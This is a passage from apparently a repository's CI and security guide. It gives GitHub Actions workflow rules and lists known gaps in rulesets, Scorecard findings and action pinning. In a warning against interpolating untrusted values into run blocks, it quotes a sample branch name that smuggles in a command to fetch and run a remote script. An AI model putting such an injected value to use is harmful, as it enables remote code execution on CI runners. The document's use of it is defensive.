  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
permissions:
  contents: read          # least privilege; add only what the job needs
jobs:
  job-id:
    name: Stable Check Name
    runs-on: ubuntu-latest
    timeout-minutes: 15   # always set one; a hung job burns runner minutes
```

Four rules that are not negotiable:

1. **Never interpolate an untrusted value into a `run:` block.** `github.head_ref`,
   `github.event.pull_request.title` and `github.event.pull_request.body` are all
   attacker-controlled — a branch named `x; curl evil.sh | sh` is a valid branch
   name. Pass them through `env:` and reference them as `"$VAR"`.
2. **Set `permissions:`.** The default token scope is broader than almost any
   job needs.
3. **Always report a conclusion.** If a job has nothing to do, succeed with a
   `::notice::` rather than being skipped.
4. **Do not gate a cheap job on an expensive one.** `PR Conventions` reports on
   the title, the branch name and the PR size — all things a contributor can fix
   without touching code. Gating it behind `Repository Hygiene` left it
   "skipped" whenever hygiene failed, which told the contributor nothing; it now
   lives in its own workflow and re-runs on a title or label edit. Cheap
   diagnostic jobs run unconditionally; expensive ones (`Verify`, which needs a
   full install and build) are allowed to depend on them.

---

## 11. Known gaps, honestly

- **No `pnpm-lock.yaml` yet.** Until Phase 0 scaffolding lands, the `Verify` job
  cannot lint, type-check, test or build. It reports success with a notice. The
  gates that do not need an application toolchain are fully active today:
  hygiene, secret scanning, documentation integrity, shell linting, workflow
  auditing and Scorecard.
- **`protect-main.yml` is a detective control, not a preventive one.** It can
  raise an incident, but it cannot undo a push. The ruleset is what prevents the
  push; the workflow is what tells you it happened.
- **The `accessibility` job is advisory.** Lighthouse in CI is a rough proxy; the
  roadmap still requires a manual NVDA/VoiceOver pass before launch.
- **The four rulesets are applied** (2026-11-15). They cannot be re-applied from
  an automation token — GitHub App installation tokens get `Resource not
  accessible by integration` on the rulesets API even with admin permission — so
  after editing a file in `.github/branch-protection/rulesets/`, somebody runs
  `apply.sh` with a personal access token, or imports the file through
  Settings → Rules → Rulesets.
- **`required_signatures` is off by default**, and ships as an opt-in file
  (`optional/require-signed-commits.json`). See §5.5.
- **Push rulesets are not applied.** They need the GitHub Team plan; the exact
  payload to add when the club upgrades is in §5.6.
- **The branch-naming and tag-naming rulesets do not appear to be enforced.**
  Name patterns are "metadata restriction" rules, which GitHub does not enforce
  on the Free plan this organisation uses: `OssSvit-patch-1` and
  `revert-49-feat/pr-agent-gemini-reviewer` were both pushed after the
  branch-naming ruleset was applied. The `PR Conventions` check
  (`check-branch-name.sh`) and the local hook are therefore the real gate on
  branch names. See §5.4.
- **`@Open-Source-Software-Club/*` teams do not exist yet**, so CODEOWNERS uses
  individual usernames. Switching to teams is a one-line-per-section change,
  documented in the CODEOWNERS header.
- **`Workflow Security` is not a required check yet.** It runs on every pull
  request and always concludes, so it can be promoted at any time (§3). It is
  not required on the first day because a finding has to be *judged* — "this
  `pull_request_target` is safe because of how the job is written" is a review
  decision, and a brand-new auditor's first findings should not be able to block
  every merge before the team has read them.
- **`publish_results` is off in Scorecard**, so no public score is published. The
  SARIF report still lands in the Security tab. See §8.
- **Actions are pinned to commit SHAs**, each with its release in a trailing
  comment. Dependabot's `github-actions` updates bump the SHA and the comment
  together, so a security release still arrives as a reviewed pull request, and
  `Workflow Security` (zizmor, `hash-pin`) rejects any new `uses:` that is not a
  full SHA. Tag pins were used until 2026-11 and were Scorecard's largest
  finding (Pinned-Dependencies, 45 alerts).
- **Scorecard findings that code cannot fix.** `Maintained` scores 0 until the
  repository is 90 days old (2027-02-13); `Code-Review` rises as merged pull
  requests carry approvals; `CII-Best-Practices` needs a maintainer to register
  the project at bestpractices.dev; `Fuzzing` does not apply to a website; and
  `Token-Permissions` keeps two job-scoped `contents: write` grants that the
  jobs cannot work without (Release Drafter writes the draft release;
  Housekeeping deletes merged branches).
- **A few actions still run on the Node 20 runtime**
  (`actions/upload-artifact@v4`, `actions/download-artifact@v4`,
  `EndBug/label-sync@v2`): the runner executes them on Node 24 with a deprecation
  warning. They are not bumped yet because the Node 24 majors either do not exist
  or would break the upload/download pairing that the `Accessibility` job depends
  on. The warning is cosmetic and Dependabot will surface the upgrade.
- **pnpm is installed by `pnpm/action-setup`, versioned by `package.json`.** The
  action reads the version from the `packageManager` field, which
  `check-lockfiles.sh` therefore requires (`"pnpm@<version>"`). There is one
  place to bump pnpm, and no `npm install --global`, which Scorecard counts as
  an unpinned download.
- **`delete_branch_on_merge` is off in repository settings**, so the weekly
  `Housekeeping` job is the only thing deleting merged branches. It needs
  `contents: write` to do that (it did not have it, so it deleted nothing).
  Turning the setting on makes the job a fallback rather than the only mechanism.
- **The deployment smoke test only runs once Vercel is connected.** With no
  deployment and no `SITE_URL`, it reports a notice and succeeds.
